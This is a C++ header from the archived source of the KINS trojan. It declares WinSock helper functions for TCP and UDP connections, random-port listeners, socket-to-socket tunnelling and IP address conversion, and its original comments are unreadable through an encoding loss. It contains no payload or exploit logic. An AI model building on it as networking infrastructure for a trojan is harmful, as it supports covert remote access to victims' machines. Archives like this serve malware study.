/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���������� ��� WinSock.
*/
#pragma once

//������ � ���������� ���� � IP.
#define IPv4_SIZE     4
#define IPv6_SIZE    16
#define IP_PORT_SIZE  2

//��������� ������� ��� ������� �� ��������� ��� ������. ����� � �� �����, ���������� ����������.
#define HZ_IPV6_CLEAR(s) {if(((SOCKADDR_IN6 *)(s))->sin6_family == AF_INET6){((SOCKADDR_IN6 *)(s))->sin6_flowinfo = ((SOCKADDR_IN6 *)(s))->sin6_scope_id = 0;}}

namespace WSocket
{
  /*
    �������������.
    
    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ���������� �� ����� � ������ fd_set.

    IN s   - ����� ��� ��������.
    IN pfs - ��������� �� fd_set.

    Return - true - ���� ����������,
             false - ���� ����������.
  */
  bool _fdIsSet(SOCKET s, fd_set *pfs);
  
  /*
    ������ ������ �� ������.

    IN s       - �����.
    OUT buf    - ����� ��� ������.
    IN bufSize - ������ ������.
    IN timeout - ���������� ����������� �������� ��������� ������, ��� 0 ��� ������������
                 �������� �� ����������� ������. ��� INFINITE ��� ������������ �������� �� ��
                 ����������� ������.

    Return     - ���������� ���������� ���� ��� SOCKET_ERROR.
  */
  int tcpRecv(SOCKET s, void *buf, int bufSize, DWORD timeout);

  /*
    ������ ������ �� ������ �� ������� ����������� ������.

    IN s       - �����.
    OUT buf    - ����� ��� ������.
    IN bufSize - ������ ������.
    IN timeout - ���������� ����������� �������� ��������� ������,  ��� 0 ��� ������������
                 �������� �� ����������� ������. ��� INFINITE ��� ������������ �������� �� ��
                 ����������� ������.

    Return     - true - � ������ ������,
                 false - � ������ ������.
  */
  bool tcpRecvAll(SOCKET s, void *buf, int bufSize, DWORD timeout);

  /*
    ������ ���� ������ �� ������ � NULL.

    IN s       - �����.
    IN size    - ������ ������.
    IN timeout - ���������� ����������� �������� ��������� ������, ��� 0 ��� ������������
                   ��������.

    Return     - true - � ������ ������,
                 false - � ������ ������.
  */
  bool tcpRecvAllToNull(SOCKET s, int size, DWORD timeout);

  /*
    ������ ������ � �����.

    IN s       - �����.
    IN buf     - ����� � �������.
    IN bufSize - ������ ������.

    Return     - true - � ������ ������,
                 false - � ������ ������.
  */
  bool tcpSend(SOCKET s, const void *buf, int bufSize);

  /*
    �������� TCP ����������.
    
    IN sockAddr - ������ �������, � �������� ����� �����������.

    Return      - ID ������ - � ������ ��������� ����������, ����� ��������� ������ ����� ������
                  ���� ������ ����� tcpClose,
                  INVALID_SOCKET - � ������ ������.
  */
  SOCKET tcpConnect(const SOCKADDR_STORAGE *sockAddr);
  
  /*
    �������� TCP ����������.
    
    IN host - �����/IPv4/IPv6.
    IN port - ����.

    Return  - ID ������ - � ������ ��������� ����������, ����� ��������� ������ ����� ������
              ���� ������ ����� tcpClose,
              INVALID_SOCKET - � ������ ������.
  */
  SOCKET tcpConnectA(const LPSTR host, const WORD port);

  /*
    ������� TCP ���� ��� ������ ����������.
    
    IN sockAddr - ������ �������.
    IN backlog  - ������������ ���������� ���������� ���������� ��� SOMAXCONN.
    
    Return      - ID ������ - � ������ ��������� �������� �����, ����� ���� ����� �� �����,
                  ���������� ������� ����� tcpClose,
                  INVALID_SOCKET - � ������ ������.
  */
  SOCKET tcpListen(const SOCKADDR_STORAGE *sockAddr, int backlog);
  
  /*
    ������� TCP ���� ��� ������ ���������� �� ������������ �����.
    
    IN family  - ��� ���������, AF_INET ��� AF_INET6.
    IN backlog - ������������ ���������� ���������� ���������� ��� SOMAXCONN.
    IN portMin - ����������� ���� � �������� ������� ����.
    IN portMax - ������������ ���� � �������� ������� ����.

    Return     - ID ������ - � ������ ��������� �������� �����, ����� ���� ����� �� �����,
                 ���������� ������� ����� tcpClose,
                 INVALID_SOCKET - � ������ ������.
    
    ����������: ������� ������������� Crypt.
  */
  SOCKET tcpListenRandom(int family, int backlog, WORD portMin, WORD portMax);

  /*
    ���������� ��� TCP_Listen ��� �������� �������� �����.
    
    IN family  - ��� ���������, AF_INET ��� AF_INET6.
    IN port    - ���� � �������� ������� ����.
    IN backlog - ������������ ���������� ���������� ���������� ��� SOMAXCONN.

    Return     - ID ������ - � ������ ��������� �������� �����, ����� ���� ����� �� �����,
                 ���������� ������� ����� tcpClose,
                 INVALID_SOCKET - � ������ ������.
  */
  SOCKET tcpListenEx(int family, WORD port, int backlog);
  
  /*
    ����������� ������ ����� ����� ������������.
    
    IN s1 - ������ �����.
    IN s2 - ������ �����.

    ����������: ����� �� ������� ����� ���������� ������ ����� ��������� ���������� ��� ������.
  */
  void tcpTunnel(SOCKET s1, SOCKET s2);
  
  /*
    ����������� ������ ����� ����� ������������, � ������������ ���������� �� �������.
    
    IN s1          - ������ �����.
    IN s2          - ������ �����.
    IN eventHandle - �������, ��� ������������ �������� ������ ����� ������.
  */
  void tcpTunnelAndWaitForWinEvent(SOCKET s1, SOCKET s2, HANDLE eventHandle);

  /*
    �������� ������� read �� �������.

    IN sockets         - ������ ������� �� ������� ��������� �������.
    IN socketsCount    - ���������� ��������� � ������� sockets.
    IN timeout         - ���������� ����������� ��������, ��� 0 ��� ������������ ��������.
    IN advSockets      - ������ �������������� ������� ��� �������� �� ������� read.
    IN advSocketsCount - ���������� ��������� � ������� advSockets.

    Return             - ID ������ �� ������� ��������� �������,
                         INVALID_SOCKET - � ������ ������, �������, ��� ������������ �������
                         �� ����� ������ sAdvSockets.

    ���������: � ������ ��������, WSAGetLastError() ����� ��������� WSAETIMEDOUT.
  */
  SOCKET tcpWaitForEvent(const SOCKET *sockets, DWORD socketsCount, DWORD timeout, const SOCKET *advSockets, DWORD advSocketsCount);

  /*
    �������� ��������� ���������� � ��������� ������ ������.
    
    IN sockets         - ������ ������� �� ������� ��������� ����������.
    IN socketsCount    - ���������� ��������� � ������� sockets.
    IN timeout         - ���������� ����������� ��������, ��� 0 ��� ������������ ��������.
    OUT sockAddr       - ����� ��� ���������� � �������, ��� NULL ���� ���������� �� �����.
    OUT index          - ������� � ������� sockets, ��� �������� ��������� �������. ����� ����
                         NULL.
    IN advSockets      - ������ �������������� ������� ��� �������� �� ������� read.
    IN advSocketsCount - ���������� ��������� � ������� advSockets.
    
    Return             - C���� - � ������ ��������� ����������, ����� ����� ����� �� �����,
                         ���������� ������� ����� tcpClose,
                         INVALID_SOCKET - � ������ ������, �������, ��� ������������ �������
                         �� ����� ������ advSockets.

    ���������: � ������ ��������, WSAGetLastError() ����� ��������� WSAETIMEDOUT.
  */
  SOCKET tcpWaitForIncomingAndAccept(SOCKET *sockets, DWORD socketsCount, DWORD timeout, SOCKADDR_STORAGE *sockAddr, LPDWORD index, SOCKET *advSockets, DWORD advSocketsCount);

  /*
    �������� � ������������ ������.

    IN s - ����� ��� ��������. �������� �������� INVALID_SOCKET.
  */
  void tcpClose(SOCKET s);

  /*
    �������� ��� ��������� �������� Nagle(TCP_NODELAY). �� ��������� ������� ��� ���� �������.

    IN s       - �����.
    IN disable - true - ��������� ��������.
                 false - �������� ��������,
    
    Return     - true - � ������ �������� ��������� ���������,
                 false - � ������ ������.
  */
  bool tcpDisableDelay(SOCKET s, bool disable);

  /*
    �������� ��� ��������� TCP keepalive.

    IN s        - �����.
    IN enable   - true - ��������.
                 false - ���������,
    IN time     - ������ ������������ � ��, ����� ������� ���������� �����.
    IN interval - �������� ������� �������, ���� �� ����� ����������.
                
               
    Return      - true - � ������ �������� ��������� ���������,
                  false - � ������ ������.
  */
  bool tcpSetKeepAlive(SOCKET s, bool enable, DWORD time, DWORD interval);

  /*
    ����� ������ ������������, �������������� ������.

    IN s       - �����.
    IN disable - true -  �������������,
                 false - �����������.
    
    Return     - true - � ������ �������� ��������� ���������,
                 false - � ������ ������.

  */
  bool setNonBlockingMode(SOCKET s, bool enable);
  
  /*
    ������� UDP ���� ��� ������ ����������.

    IN sockAddr - ������ �������.

    Return      - ID ������ - � ������ ��������� �������� �����, ����� ���� ����� �� �����,
                  ���������� ������� ����� udpClose,
                  INVALID_SOCKET - � ������ ������.
  */
  SOCKET udpListen(const SOCKADDR_STORAGE *sockAddr);

  /*
    �������� � ������������ ������.

    IN s - ����� ��� ��������. �������� �������� INVALID_SOCKET.
  */
  void udpClose(SOCKET s);

  /*
    �������������� IP � ������ ip:port.

    IN sockAddr - ������ IP.
    OUT buffer  - ����� ��� ������, ������ ���� �������� �� ����� MAX_PATH.
    
    Return      - true - � ������ �������� �����������,
                  false - � ����� ������, ��� ���� string ����� �������� "0:0".
  */
  bool ipToStringW(const SOCKADDR_STORAGE *sockAddr, LPWSTR buffer);

  /*
    �������������� ������ � IP.

    OUT sockAddr - ������ IP.
    IN buffer    - ������.

    Return       - true - � ������ �������� �����������,
                   false - � ������ ������, ��� ���� sockAddr ����� �������.
  */
  bool stringToIpW(SOCKADDR_STORAGE *sockAddr, const LPWSTR string);

  /*
    ���������, �������� �� IP ���������.
    
    IN sockAddr - ������ IP.

    Return      - true - ���� ���������,
                  false - ���� �� ���������.
  */
  bool _isLocalIp(const SOCKADDR_STORAGE *sockAddr);

  /*
    ��������� ������ IP-������� ���� �����������.

    IN family - AF_INET ��� AF_INET6.

    Return    - NULL - � ������ ������,
                ��� ����� ������ � ������ ������ (����� ���������� ����� Mem).
  */
  SOCKET_ADDRESS_LIST *getListOfIpAddresses(int family);

  /*
    ��������� ���� ������ AF_*.

    IN s   - �����.
    
    Return - AF_*.
  */
  USHORT getFamily(SOCKET s);
};
